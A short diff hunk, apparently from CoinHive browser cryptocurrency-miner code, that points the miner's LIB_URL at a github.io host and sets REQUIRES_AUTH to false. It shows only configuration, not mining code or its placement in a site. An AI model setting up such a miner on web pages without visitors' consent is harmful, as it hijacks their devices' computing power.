@@ -579,7 +579,7 @@
 
 self.CoinHive = self.CoinHive || {};
 self.CoinHive.CONFIG = {
-    LIB_URL: "",
+    LIB_URL: "https://eracle.github.io/",
     ASMJS_NAME: "worker-asmjs.min.js",
     REQUIRES_AUTH: false,
     WEBSOCKET_SHARDS: [
